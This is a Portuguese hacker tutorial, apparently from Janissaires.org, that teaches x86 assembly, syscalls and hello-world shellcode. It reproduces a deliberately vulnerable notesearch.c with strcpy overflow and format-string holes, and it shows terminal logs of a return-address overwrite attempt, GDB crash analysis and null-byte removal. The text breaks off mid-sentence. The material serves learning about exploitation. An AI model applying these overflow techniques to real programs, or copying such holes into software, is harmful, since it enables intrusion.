@@ -1,0 +1,882 @@
+                              \|       ...                       [banner]
+                              -:.     //||\\       _.            written for Janissaires.org
+                                `::::' Q Q ``::::::+.
+                                      ._"__.'      \             HEY, YOU, W8!
+                                  ____ `==' _._                  LETS UNDERSTAND HOW WORK YOUR COMPUTER!                  
+                                .'             `.
+                              .' .:-      .-.    `               
+                            .' '.')       ' _  /||.
+                       __.--|_.'  '      : ( \/' /\\
+                      /,=-U'     '      :   `.  `. /U
+                                ' '  .  (     -._.---"
+                      ....-----( ' . `   -.                      NBDU1NDER corp.
+                )   .:\:::\    '`. `  `  .'                      greetx DRC n all n00b friends, like me *woah
+            _  (  .:::::::::....--`--..-' \
+           ( ``-.\:::''               \    \
+           \\ ""\\-'                   `..:.\
+            `:-=/)                       `(::)
+                 `                      .:::/
+   _______________________________     |::/   _________          [/banner]
+                     ______...       .."\\/
+  .......------""""""       __..   . \\ -. _   .
+                    __..--''    ..'...`- (\ `-'
+          __..---"""  ..:::::::::::::::.`.`-.   .
+        ''               `````````:::::::.`._)   .
+                       .-'            `:'''       .
+                    .-'               .            .
+                   '                 .              .
+                                    .                .
+
+       
+
+
+        [------------] Hello! ASM/SHELLCODES simple EXPLANATION [------------]
+
+[+] INTRO
+[+] HELLO WORLD!
+[+] SYSTEM CALLS
+
+[+] INTRO TO SHELLCODES
+[+] STACKS
+[+] GDB INVESTIGATE
+[+] REMOVING NULL BYTES n EXPLOITING
+[+] FINAL CONSIDERATIONS
+
+
+~
+
+
+                       ____...
+              .-"--"""".__    `.
+             |            `    |
+   (         `._....------.._.:
+    )         .()''        ``().
+   '          () .=='  `===  `-.                        $~ INTRO ~$
+    . )       (   <o>  <o>    g)
+     )         )     /        J
+    (          |.   /      . (
+    $$         (.  (_'.   , )|`
+    ||         |\`-....--'/  ' \
+   /||.         \\ | | | /  /   \.
+  //||(\         \`-===-'  '     \o.
+ .//7' |)         `. --   / (     OObaaaad888b.
+ (<<. / |     .a888b`.__.'d\     OO888888888888a.
+  \  Y' |    .8888888aaaa88POOOOOO888888888888888.
+   \  \ |   .888888888888888888888888888888888888b
+    |   |  .d88888P88888888888888888888888b8888888.
+    b.--d .d88888P8888888888888888a:f888888|888888b
+    88888b 888888|8888888888888888888888888\8888888
+
+
+
+Os bytes de shellcodes, são intruções de uma máquina de arquitetura específica. Escrever um programa em ASM é diferente de escrevê-lo em C, mas com
+princípios similares. O SO gerencia coisas como input, output, process control, comunicações em geral de rede no kernel. Programas em  C compilados
+basicamente desenvolvem essas tarefas, fazendo chamadas(syscalls) ao kernel.
+
+Em C, as bibliotecas padrão são usadas para  conveniência e  portabilidade. Um app  em C que usa  "printf()" para a  saída de uma  string, pode ser
+compilado para muitos SOs diferentes, desde a lib saiba a chamada do sistema apropiado para várias arquiteturas.
+
+Por definição, a linguagem ASM já é específica para uma determinada arquitetura  de processador, por  isso, a portabilidade  é "impossível". Não há
+libs padrão; em vez disso, a chamada do sistema central tem que ser feita diretamente. Vamos aos exemplos.
+
+
+
+
+
+                  _)_
+               .-'(/ '-.
+              /    `    \
+             /  -     -  \
+            (`  a     a  `)
+             \     ^     /
+              '. '---' .'                              $~ HELLO WORLD ~$
+              .-`'---'`-.
+             /           \
+            /  / '   ' \  \
+          _/  /|       |\  \_
+         `/|\` |+++++++|`/|\`
+              /\       /\
+              | `-._.-` |
+              \   / \   /
+              |_ |   | _|
+              | _|   |_ |
+              (ooO   Ooo)
+
+
+- helloworld.c
+
+#include <stdio.h>
+int main() {
+printf("Hello, world!\n");
+return 0;
+}
+
+
+Quando o programa está rodando, ele flui através da biblioteca I/O padrão, fazendo uma  syscall para escrever a  linha "Hello, world!" *Compilando e
+analisando...
+
+
+root@nbdu1nder-desktop:/home/nbdu1nder # gcc helloworld.c
+root@nbdu1nder-desktop:/home/nbdu1nder # strace ./a.out
+execve("./a.out", ["./a.out"], [/* 31 vars */]) = 0
+brk(0)                                  = 0x804a000
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fe5000
+access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
+open("/etc/ld.so.cache", O_RDONLY)      = 3
+fstat64(3, {st_mode=S_IFREG|0644, st_size=41610, ...}) = 0
+mmap2(NULL, 41610, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7fda000
+close(3)                                = 0
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 3
+read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\0`\1\000"..., 512) = 512
+fstat64(3, {st_mode=S_IFREG|0644, st_size=1307104, ...}) = 0
+mmap2(NULL, 1312164, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7e99000
+mmap2(0xb7fd4000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x13b) = 0xb7fd4000
+mmap2(0xb7fd7000, 9636, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7fd7000
+close(3)                                = 0
+mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e98000
+set_thread_area({entry_number:-1 -> 6, base_addr:0xb7e986c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
+mprotect(0xb7fd4000, 4096, PROT_READ)   = 0
+munmap(0xb7fda000, 41610)               = 0
+fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
+mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fe4000
+write(1, "Hello, world!\n", 14Hello, world!
+)         = 14
+exit_group(0)                           = ?
+Process 7666 detached
+
+
+"
+write(1, "Hello, world!\n", 14Hello, world!
+)         = 14
+"
+
+Como podemos ver, o programa compilado apenas imprime uma sequência. As chamadas de sistema no início estão estabelecendo o ambiente e memória para o programa, 
+mas, a parte importante é o syscall write() mostrado acima. Isso é o que promove a saída da sequência. *Dando uma olhada no manual do Unix para o write()
+
+
+WRITE(2)                   Linux Programmer’s Manual                  WRITE(2)
+
+NAME
+       write - write to a file descriptor
+
+SYNOPSIS
+       #include <unistd.h>
+
+       ssize_t write(int fd, const void *buf, size_t count);
+
+DESCRIPTION
+       write()  writes  up  to  count bytes to the file referenced by the file
+       descriptor fd from the buffer starting at buf.  POSIX requires  that  a
+       read()  which  can  be  proved  to  occur  after a write() has returned
+       returns the new data.  Note that not all file systems  are  POSIX  con-
+       forming.
+
+RETURN VALUE
+       On  success,  the  number of bytes written are returned (zero indicates
+       nothing was written).  On error, -1  is  returned,  and  errno  is  set
+       appropriately.   If  count  is zero and the file descriptor refers to a
+       regular file, 0 will be returned without causing any other effect.  For
+       a special file, the results are not portable.
+
+ERRORS
+       EAGAIN Non-blocking  I/O  has  been  selected  using O_NONBLOCK and the
+              write would block.
+
+       EBADF  fd is not a valid file descriptor or is not open for writing.
+       EFAULT buf is outside your accessible address space.
+
+       EFBIG  An attempt was made to write a file that exceeds the implementa-
+              tion-defined  maximum file size or the process’ file size limit,
+              or to write at a position past the maximum allowed offset.
+
+       EINTR  The call was interrupted by a signal before any data  was  writ-
+              ten.
+
+       EINVAL fd  is attached to an object which is unsuitable for writing; or
+              the file was opened with  the  O_DIRECT  flag,  and  either  the
+              address  specified  in buf, the value specified in count, or the
+              current file offset is not suitably aligned.
+
+       EIO    A low-level I/O error occurred while modifying the inode.
+
+       ENOSPC The device containing the file referred to by fd has no room for
+              the data.
+
+       EPIPE  fd is connected to a pipe or socket whose reading end is closed.
+              When this happens the writing process will also receive  a  SIG-
+              PIPE  signal.  (Thus, the write return value is seen only if the
+              program catches, blocks or ignores this signal.)
+
+       Other errors may occur, depending on the object connected to fd.
+
+CONFORMING TO
+       SVr4, 4.3BSD, POSIX.1-2001.
+
+       Under SVr4 a write may be interrupted and return EINTR  at  any  point,
+       not just before any data is written.
+
+NOTES
+       A  successful return from write() does not make any guarantee that data
+       has been committed to disk.  In fact, on some buggy implementations, it
+       does  not  even guarantee that space has successfully been reserved for
+       the data.  The only way to be sure is to call fsync(2)  after  you  are
+       done writing all your data.
+
+SEE ALSO
+       close(2),  fcntl(2),  fsync(2), ioctl(2), lseek(2), open(2), pwrite(2),
+       read(2), select(2), writev(3), fwrite(3)
+
+Linux 2.0.32                      2001-12-13                          WRITE(2)
+
+
+A saída do strace também mostra parâmetros para o syscall - buf e count - são um indicativo para nossa sequência.
+O parâmetro fd de 1 é um padrão especial de arquivo descritivo. Os arquivos descritivos são usados para quase
+tudo no Unix: input, output, arquivo de acesso, network sockets, e assim por diante.
+
+Os primeiros três números dos arquivos descritivos (0, 1, 2) são automaticamente usados para a entrada padrão, saída
+e erro. Esses valores são definidos:
+
+
+- parte de /usr/include/unistd.h
+/* Standard file descriptors.  */
+#define	STDIN_FILENO	0	/* Standard input.  */
+#define	STDOUT_FILENO	1	/* Standard output.  */
+#define	STDERR_FILENO	2	/* Standard error output.  */
+
+
+1 imprimirá os bytes;
+0 irá "absorver" os bytes;
+2 mostra erros.
+
+
+
+
+
+                  ___.....
+                               .-'        `.
+                              ' `.---------...
+                             (:'            `.\
+                            '  (               .
+                            (' `.           ':  :
+                           ( (.'- .==._   _= :  `.
+                           `_(   ' _o' `.'_o`-\_:'                  $~ SYSTEM CALLS ~$
+                             :`         .     ::
+                             :: \   .'_,J \  ':.
+                             =-`._.'_.::::.`_:'=.
+                            .-:-.=:-::.__:.=:-:=-
+                             -:/-:.'=:/::.\.-=:=
+                              '././:/.::|,\`:\=.a._
+                              ba''/:|:|::|:\\``888888.
+                          _.a(88/  _.='\.   .a388888888a.
+                      _.a8883a8/.:"'    `:..a838888888888aa.
+                  _.a888888388/''        ')'83888888888888888)
+                .888888888388/           (:838888888888888888)
+               .888888888388P           /8"8888888888888888a88)
+               888888888838P           /8888888888P8888888P88'
+               888888888838           /88388888888a88888888P'
+               888888888838:         /88388888888P888888P"
+                88a88888838a        /88388888888a8888P"
+                 "P888888388a      /88388888888a888P'
+                   "888883888a...aa88388888888a888P
+                     "88838888888888388888888a888P
+                      8883888888888388888888a888P
+                      "88388888888388888888a:f8P
+
+
+
+Toda chamada é enumerada, assim elas podem ser referenciadas por números. Elas estão listadas em "/usr/include/asm-i386/unistd.h":
+
+#ifndef _ASM_I386_UNISTD_H_
+#define _ASM_I386_UNISTD_H_
+
+/*
+ * This file contains the system call numbers.
+ */
+
+#define __NR_restart_syscall      0
+#define __NR_exit                 1
+#define __NR_fork                 2
+#define __NR_read                 3
+
+etc....
+
+
+Para reescrever helloworld.c em ASM, faremos uma chamadas de sistema para a função write() e depois exit(), assim o processo sai
+integralmente. Isso pode ser feito na montagem x86 utilizando duas instruções: mov e int.
+
+As instruções para o processador x86 tem 1, 2, 3 ou nenhum operador. Os operadores podem ser valores numéricos, endereços de memória
+ou registradores de processadores, sendo EAX, EBX, ECX, EDX, ESI, EDI, EBP e ESB. *Explicando algumas intruções
+
+A instrução mov copia um valor entre seus dois operandos. Utilizando um ASM de syntax Intel, o primeiro operador é o destino e o segundo
+a fonte.
+
+A intrução int envia um sinal interrompido para o núcleo definido pelo seu operando. Com o kernel LNX, a interrupção 0x80 é usada para
+dizer ao núcleo para fazer uma chamada de sistema. Quando int 0x80 é executado, irá acontecer uma chamada baseada nos quatro primeiros
+registradores. O registrador EAX é usado para especificar qual chamada de sistema fazer, enquanto os registradores EBC, ECX e EDX são
+usados para "segurar" parâmetros.
+
+
+- helloworld.asm
+section .data       ; data segment
+msg     db      "Hello, world!", 0x0a   ; the string and newline char
+
+section .text       ; text segment
+global _start       ; Default entry point for ELF linking
+
+_start:
+  ; SYSCALL: write(1, msg, 14) 
+  mov eax, 4        ; put 4 into eax, since write is syscall #4
+  mov ebx, 1        ; put 1 into ebx, since stdout is 1
+  mov ecx, msg      ; put the address of the string into ecx
+  mov edx, 14       ; put 14 into edx, since our string is 14 bytes
+  int 0x80          ; Call the kernel to make the system call happen
+
+  ; SYSCALL: exit(0)
+  mov eax, 1        ; put 1 into eax, since exit is syscall #1
+  mov ebx, 0        ; exit with success
+  int 0x80          ; do the syscall
+
+
+As instruções desse programa são diretas. Para a syscall write(), o valor de 4 é colocado em EAX desde que o mesmo seja a chamada de número quatro.
+Então o valor de 1 é colocado em EBX, desde que o primeiro parâmetro de write() sejá o arquivo descritivo para a saída padrão. Em seguida, o endereço
+da sequência é colocado no ECX, e o comprimento (14 bytes) é colocado em EDX.
+
+Para sair totalmente, o método exit() deve ser chamado com um parâmetro de 0. Assim, o valor de 1 é colocado em EAX, desde que o método seja a chamada
+de sistema de número 1, e o valor de 0 é colocado em EBX. Dessa forma, tudo é interrompido e roda novamente.
+
+Para criar um binário executável, esse código deve ser montado. Enquanto compila o código C, o GCC cuida disso automaticamente. Nós criaremos um binário
+de formato executável e de link (ELF), então, a queue global_start mostra onde as intruções ASM são iniciadas.
+
+O assembler NASM com o parâmetro -f elf montará o helloworld.asm em um arquivo objeto pronto para ter um attach com um ELF. Por padrão ele será chamado
+de helloworld.o. O programa que produzirá o binário será o ld.
+
+
+root@nbdu1nder-desktop:/home/nbdu1nder/src # nasm -f elf helloworld.asm
+root@nbdu1nder-desktop:/home/nbdu1nder/src # ld helloworld.o
+root@nbdu1nder-desktop:/home/nbdu1nder/src # ./a.out
+Hello, world!
+root@nbdu1nder-desktop:/home/nbdu1nder/src #
+
+Mas isso ainda não é um shellcode, veremos no tópico a seguir o porque...
+
+[------------------------------------------------------------------------]
+
+
+
+
+
+.                                       ,
+)).               -===-               ,((
+))).                                 ,(((
+))))).            .:::.           ,((((((
+))))))))).        :. .:        ,(((((((('
+`))))))))))).     : - :    ,((((((((((((
+ ))))))))))))))))_:' ':_((((((((((((((('
+ `)))))))))))).-' \___/ '-._(((((((((((                  $~ INTRO TO SHELLCODES ~$
+  `))))_._.-' __)(     )(_  '-._._(((('
+   `))'---)___)))'\_ _/'((((__(---'(('
+     `))))))))))))|' '|(((((((((((('
+       `)))))))))/'   '\((((((((('
+         `)))))))|     |((((((('
+          `))))))|     |(((((('
+                /'     '\
+               /'       '\
+              /'         '\
+             /'           '\
+             '---..___..---'
+
+
+Shellcode é um grupo de instruções - que devem ser independentes - onde literalmente é injetado num programa em execução. No shellcode, os bytes para a
+string "Hello, world!" devem ser misturados com os das intruções ASM, desde que não haja segmentos de memória definíveis ou "previsíveis". 
+
+Tudo ocorre bem até o EIP tentar interpretar a sequência como instruções, mas, para acessá-la, precisamos de um pointer. Quando o shellcode é executado, o pointer
+poderá estar em qualquer posição da memória.
+
+
+
+$~ STACKS ~$
+Instruções especiais para operações com pilhas:
+
+push <source> -> Coloca o operando <source> na pilha
+pop <destination> -> Retira um valor da pilha e guarda no <destination>
+call <location> -> Chama uma função, pulando a execução para o endereço do operando <location>. O endereço é colocado na pilha, podendo ser retomado depois.
+ret -> Retorna um método, disparando o endereço de retorno da pilha e pulando a execução.
+
+A arquitetura da pilha explora possibilidades pelas instruções call e ret. Quando a função é chamada, o endereço de retorno da próxima instrução é colocado
+na pilha, começando a estrutura de dados. Depois que a função termina, a instrução ret retira o endereço de retorno da pilha e pula o EIP de volta. Pela
+transcrição do endereço de retorno guardado sobre a pilha antes de instrução ret, podemos tomar o controle da execução de um aplicativo.
+
+Isso pode ser utilizado de forma indevida em um outro caminho para resolver o problema de abordar os dados na sequência, sendo colocada diretamente após a
+instrução da chamada, o endereço será pressionado para a pilha como retorno. Ao invés de chamar uma função, podemos dar um pull em um registrador. Mostrarei
+essa técnica a seguir:
+
+- helloworld1.s
+BITS 32             ; tell nasm this is 32-bit code
+
+  call mark_below   ; call below the string to instructions
+  db "Hello, world!", 0x0a, 0x0d  ; with newline and carriage return bytes
+
+mark_below:
+; ssize_t write(int fd, const void *buf, size_t count);
+  pop ecx           ; pop the return address (string ptr) into ecx
+  mov eax, 4        ; write syscall #
+  mov ebx, 1        ; STDOUT file descriptor
+  mov edx, 15       ; length of the string
+  int 0x80          ; do syscall: write(1, string, 14)
+
+; void _exit(int status);
+  mov eax, 1        ; exit syscall #
+  mov ebx, 0        ; status = 0   
+  int 0x80          ; do syscall:  exit(0)
+
+A chamada da instrução pula a execução sob a string. Isso também "esmaga" o endereço da próxima instrução para a pilhar; a próx instrução, no caso, é o início
+da string. O endereço de retorno pode imediatamente ser disparado a partir da pilha dentro do registrador apropriado. Sem usar nenhum segmento de memória, essas
+strings, injetadas em um processo existente, serão executadas de modo completamente independente. Isso significa que, quando elas são montadas, não podem ser ligadas
+a um executável.
+
+root@nbdu1nder-desktop:/home/nbdu1nder/src # nasm helloworld1.s
+root@nbdu1nder-desktop:/home/nbdu1nder/src # ls -l helloworld1
+-rw-r--r-- 1 nbdu1nder nbdu1nder 50 2013-09-18 23:29 helloworld1
+root@nbdu1nder-desktop:/home/nbdu1nder/src # hexdump -C helloworld1
+00000000  e8 0f 00 00 00 48 65 6c  6c 6f 2c 20 77 6f 72 6c  |.....Hello, worl|
+00000010  64 21 0a 0d 59 b8 04 00  00 00 bb 01 00 00 00 ba  |d!..Y...........|
+00000020  0f 00 00 00 cd 80 b8 01  00 00 00 bb 00 00 00 00  |................|
+00000030  cd 80                                             |..|
+00000032
+root@nbdu1nder-desktop:/home/nbdu1nder/src # ndisasm -b32 helloworld1
+00000000  E80F000000        call 0x14
+00000005  48                dec eax
+00000006  656C              gs insb
+00000008  6C                insb
+00000009  6F                outsd
+0000000A  2C20              sub al,0x20
+0000000C  776F              ja 0x7d
+0000000E  726C              jc 0x7c
+00000010  64210A            and [fs:edx],ecx
+00000013  0D59B80400        or eax,0x4b859
+00000018  0000              add [eax],al
+0000001A  BB01000000        mov ebx,0x1
+0000001F  BA0F000000        mov edx,0xf
+00000024  CD80              int 0x80
+00000026  B801000000        mov eax,0x1
+0000002B  BB00000000        mov ebx,0x0
+00000030  CD80              int 0x80
+root@nbdu1nder-desktop:/home/nbdu1nder/src # 
+
+O assembler nasm converte o código ASM para um código que seja interpretado pela máquina, e o ndisasm converte isso em Assembly. Essas tools são utilizadas acima
+para mostrar a relação entre os bytes do código de máquina e as intruções em ASM. Vou utilizar um programa vulnerável retirado do livro The Art of Exploitation para 
+demonstrar algumas coisas:
+
+- notesearch.c
+#include <stdio.h>
+#include <string.h>
+#include <fcntl.h>
+#include <sys/stat.h>
+#include "hacking.h"
+
+#define FILENAME "/var/notes"
+
+int print_notes(int, int, char *);   // note printing function
+int find_user_note(int, int);        // seek in file for a note for user
+int search_note(char *, char *);     // search for keyword function
+void fatal(char *);                  // fatal error handler
+
+int main(int argc, char *argv[]) {
+	int userid, printing=1, fd; // file descriptor
+	char searchstring[100];
+
+	if(argc > 1)                        // If there is an arg
+		strcpy(searchstring, argv[1]);   //   that is the search string
+	else                                // otherwise
+		searchstring[0] = 0;             //   search string is empty
+
+	userid = getuid();
+	fd = open(FILENAME, O_RDONLY);   // open the file for read-only access
+	if(fd == -1)
+		fatal("in main() while opening file for reading");
+
+	while(printing)
+		printing = print_notes(fd, userid, searchstring);
+	printf("-------[ end of note data ]-------\n");
+	close(fd);
+}
+
+// A function to print the notes for a given uid that match
+// an optional search string
+// returns 0 at end of file, 1 if there are still more notes
+int print_notes(int fd, int uid, char *searchstring) {
+	int note_length;
+	char byte=0, note_buffer[100];
+	
+	note_length = find_user_note(fd, uid);
+	if(note_length == -1)  // if end of file reached
+		return 0;           //   return 0
+
+	read(fd, note_buffer, note_length); // read note data
+	note_buffer[note_length] = 0;       // terminate the string
+	
+	if(search_note(note_buffer, searchstring)) // if searchstring found
+		printf(note_buffer);                    //   print the note
+	return 1;
+}
+
+// A function to find the next note for a given userID
+// returns -1 if the end of the file is reached
+// otherwise it returns the length of the found note
+int find_user_note(int fd, int user_uid) {
+	int note_uid=-1;
+	unsigned char byte;
+	int length;
+
+	while(note_uid != user_uid) {  // loop until a note for user_uid is found
+		if(read(fd, &note_uid, 4) != 4) // read the uid data
+			return -1; // if 4 bytes aren't read, return end of file code
+		if(read(fd, &byte, 1) != 1) // read the newline separator
+         return -1;
+
+		byte = length = 0;
+		while(byte != '\n') {  // figure out how many bytes to the end of line
+			if(read(fd, &byte, 1) != 1) // read a single byte
+				return -1;     // if byte isn't read, return end of file code
+			length++;  
+		}
+	}
+	lseek(fd, length * -1, SEEK_CUR); // rewind file reading by length bytes
+
+	printf("[DEBUG] found a %d byte note for user id %d\n", length, note_uid);
+	return length;
+}
+
+// A function to search a note for a given keyword
+// returns 1 if a match is found, 0 if there is no match
+int search_note(char *note, char *keyword) {
+	int i, keyword_length, match=0;
+
+	keyword_length = strlen(keyword);
+	if(keyword_length == 0)  // if there is no search string
+		return 1;              // always "match"
+	
+	for(i=0; i < strlen(note); i++) { // iterate over bytes in note
+		if(note[i] == keyword[match])  // if byte matches keyword
+			match++;   // get ready to check the next byte
+		else {        //   otherwise
+			if(note[i] == keyword[0]) // if that byte matches first keyword byte
+				match = 1;  // start the match count at 1
+			else
+				match = 0;  // otherwise it is zero
+		}
+		if(match == keyword_length) // if there is a full match
+			return 1;   // return matched
+	}
+	return 0;  // return not matched
+}
+
+
+root@nbdu1nder-desktop:/home/nbdu1nder/src # export SHELLCODE=$(cat helloworld1)
+root@nbdu1nder-desktop:/home/nbdu1nder/src # ./getenvaddr SHELLCODE ./notesearch
+SHELLCODE will be at 0xbffff9cb
+root@nbdu1nder-desktop:/home/nbdu1nder/src # ./notesearch $(perl -e 'print "\xc6\xf9\xff\xbf"x40')
+-------[ end of note data ]-------
+Falha de segmentação
+root@nbdu1nder-desktop:/home/nbdu1nder/src # 
+
+
+
+
+
+                                            |
+                                      --====|====--
+                                            |                $~ GDB INVESTIGATE ~$
+
+                                        .-"""""-. 
+                                      .'_________'. 
+                                     /_/_|__|__|_\_\
+                                    ;'-._       _.-';
+               ,--------------------|    `-. .-'    |--------------------,
+                ``""--..__    ___   ;       '       ;   ___    __..--""``
+                          `"-// \\.._\             /_..// \\-"`
+                             \\_//    '._       _.'    \\_//
+                              `"`        ``---``        `"`
+
+
+Um caminho para depurar programas é um registro da posição da memória. A partir de um terminal, o SO pode fazer a contagem para a memória
+descarregada quando o programa sofre crash, utilizando o comando ulimit -c unlimited. Isso significa que os arquivos de registro da posição
+da memória são permitidos o quanto for necessário. *Analisando a situação...
+
+
+root@nbdu1nder-desktop:/home/nbdu1nder/src # ulimit -c unlimited
+root@nbdu1nder-desktop:/home/nbdu1nder/src # export SHELLCODE=$(cat helloworld1)root@nbdu1nder-desktop:/home/nbdu1nder/src # ./getenvaddr SHELLCODE ./notesearchSHELLCODE will be at 0xbffff9cb
+root@nbdu1nder-desktop:/home/nbdu1nder/src # ./notesearch $(perl -e 'print "\xc6\xf9\xff\xbf"x40')
+-------[ end of note data ]-------
+Falha de segmentação (core dumped)
+root@nbdu1nder-desktop:/home/nbdu1nder/src # ls -l ./core
+-rw------- 1 root root 147456 2013-09-19 00:15 ./core
+root@nbdu1nder-desktop:/home/nbdu1nder/src # gdb -q -c ./core
+(no debugging symbols found)
+Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".
+Core was generated by `./notesearch ?????????????????????????????????????????????????????????????????
+Program terminated with signal 11, Segmentation fault.
+#0  0xbffff9cf in ?? ()
+(gdb) set dis intel 
+(gdb) x/5i 0xbffff9cb
+0xbffff9cb:     call   0x2c6541df
+0xbffff9d0:     ins    BYTE PTR es:[edi],[dx]
+0xbffff9d1:     outs   [dx],DWORD PTR ds:[esi]
+0xbffff9d2:     sub    al,0x20
+0xbffff9d4:     ja     0xbffffa45
+(gdb) i r eip
+eip            0xbffff9cf       0xbffff9cf
+(gdb) x/32xb 0xbffff9cb
+0xbffff9cb:     0xe8    0x0f    0x48    0x65    0x6c    0x6c    0x6f    0x2c
+0xbffff9d3:     0x20    0x77    0x6f    0x72    0x6c    0x64    0x21    0x0a
+0xbffff9db:     0x0d    0x59    0xb8    0x04    0xbb    0x01    0xba    0x0f
+0xbffff9e3:     0xcd    0x80    0xb8    0x01    0xbb    0xcd    0x80    0x00
+(gdb) quit
+root@nbdu1nder-desktop:/home/nbdu1nder/src # hexdump -C helloworld1
+00000000  e8 0f 00 00 00 48 65 6c  6c 6f 2c 20 77 6f 72 6c  |.....Hello, worl|
+00000010  64 21 0a 0d 59 b8 04 00  00 00 bb 01 00 00 00 ba  |d!..Y...........|
+00000020  0f 00 00 00 cd 80 b8 01  00 00 00 bb 00 00 00 00  |................|
+00000030  cd 80                                             |..|
+00000032
+
+GDB quando carregado, o estilo de "desmontagem" do arquivo é trocado para Intel. Visto que estamos rodando como root, o arquivo .gdbinit não
+será usado. A memória onde o shellcode está é examinada. As intruções parecem incorretas, mas o que causou o bug foi a primeira. Pelo menos
+com a execução redirecionada, ocorreu alguma coisa errada com os bytes do shellcode.
+
+Frequentemente, o shellcode será injetado em um processo como uma sequência usando métodos como strcpy(), tais quais, serão simplesmente determinados
+no primeiro null byte, produzinho um shellcode incompleto e inúti na memória. Para que ele funcione, não deverá conter bytes nulos.
+
+
+
+
+
+
+                      <>
+        .-"""-.       ||::::::==========
+       /=      \      ||::::::==========
+      |- /~~~\  |     ||::::::==========
+      |=( '.' ) |     ||================
+      \__\_=_/__/     ||================
+       {_______}      ||================
+     /` *       `'--._||
+    /= .     [] .     { >                     $~ REMOVING NULL BYTES ~$
+   /  /|ooo     |`'--'||
+  (   )\_______/      ||
+   \``\/       \      ||
+    `-| ==    \_|     ||
+      /         |     ||
+     |=   >\  __/     ||
+     \   \ |- --|     ||
+      \ __| \___/     ||
+      _{__} _{__}     ||
+     (    )(    )     ||
+ ^^~  `"""  `"""  ~^^^~^^~~~^^^~^^^~^^^~^^~^
+
+Observe:
+
+root@nbdu1nder-desktop:/home/nbdu1nder/src # ndisasm -b32 helloworld1
+00000000  E80F000000        call 0x14
+00000005  48                dec eax
+00000006  656C              gs insb
+00000008  6C                insb
+00000009  6F                outsd
+0000000A  2C20              sub al,0x20
+0000000C  776F              ja 0x7d
+0000000E  726C              jc 0x7c
+00000010  64210A            and [fs:edx],ecx
+00000013  0D59B80400        or eax,0x4b859
+00000018  0000              add [eax],al
+0000001A  BB01000000        mov ebx,0x1
+0000001F  BA0F000000        mov edx,0xf
+00000024  CD80              int 0x80
+00000026  B801000000        mov eax,0x1
+0000002B  BB00000000        mov ebx,0x0
+00000030  CD80              int 0x80
+
+Claramente a primeira instrução call() está com byte nulo "E80F000000". Para contornar esse problema, podemos fazer uma chamada utilizando um valor negativo
+para mover para trás na execução, um código de máquina para essa instrução que não terá nenhum byte nulo. 
+
+A revisão seguinte do shellcode helloworld usa uma implmentação padrão; pula para o fim do shellcode para uma chamada que por sua vez, pulará para trás pra
+uma instrução pop no início do shellcode *Deu pra entender? r$r$r$
+
+- helloworld2.s
+BITS 32             ; tell nasm this is 32-bit code
+
+jmp short one       ; jump down to a call at the end
+
+two:
+; ssize_t write(int fd, const void *buf, size_t count);
+  pop ecx           ; pop the return address (string ptr) into ecx
+  mov eax, 4        ; write syscall #
+  mov ebx, 1        ; STDOUT file descriptor
+  mov edx, 15       ; length of the string
+  int 0x80          ; do syscall: write(1, string, 14)
+
+; void _exit(int status);
+  mov eax, 1        ; exit syscall #
+  mov ebx, 0        ; status = 0   
+  int 0x80          ; do syscall:  exit(0)
+
+one:
+  call two   ; call back upwards to avoid null bytes
+  db "Hello, world!", 0x0a, 0x0d  ; with newline and carriage return bytes
+
+
+
+root@nbdu1nder-desktop:/home/nbdu1nder/src # nasm helloworld2.s
+root@nbdu1nder-desktop:/home/nbdu1nder/src # ndisasm -b32 helloworld2
+00000000  EB1E              jmp short 0x20
+00000002  59                pop ecx
+00000003  B804000000        mov eax,0x4
+00000008  BB01000000        mov ebx,0x1
+0000000D  BA0F000000        mov edx,0xf
+00000012  CD80              int 0x80
+00000014  B801000000        mov eax,0x1
+00000019  BB00000000        mov ebx,0x0
+0000001E  CD80              int 0x80
+00000020  E8DDFFFFFF        call 0x2
+00000025  48                dec eax
+00000026  656C              gs insb
+00000028  6C                insb
+00000029  6F                outsd
+0000002A  2C20              sub al,0x20
+0000002C  776F              ja 0x9d
+0000002E  726C              jc 0x9c
+00000030  64210A            and [fs:edx],ecx
+00000033  0D                db 0x0D
+root@nbdu1nder-desktop:/home/nbdu1nder/src # 
+
+
+Após a montagem e desmontagem desse novo shellcode, mostra-se que a instrução "jmp short one" agora é livre de bytes nulos. Isso resolve
+o primeiro problema, mas ainda existem muitos outros, como pode-se ver acima... Isso pode ser eliminado com o endereçamento do registrador.
+Note que a primeira instrução jmp é na verdade, um jump curto. Isso significa que a execução pode pular apenas um máx de 128bytes em cada
+direção. A instrução jmp normal (que não tem versão curta) permite pulos muito maiores. A diferença entre os códigos das variedades de saltos é:
+
+EB 1E              jmp short 0x20
+vs.
+E9 1E 00 00 00     jmp 0x23
+
+Os registradores (EAX, EBX, ECX, EDX... etc) possuem 32bits de exentesão. O E representa um extended porque originalmente esses eram de 16 bits
+chamados de AX, BX, CX, DX etc. Essas versões antigas ainda podem ser utilizadas para acessar os primeiros 16 bits de cada registrador de 32 bits
+correspondente. Além disso, os bytes individuais dos registradores podem ser acessados como de 8 bits, chamados de AL, AH, BL, BH etc... Onde L representa
+low byte e H, high byte. Naturalmente, as instruções utilizando os registradores menores apenas necessitam especificar operadores até o tamanha de bits do
+registro. As três variações de uma intrução mov são:
+
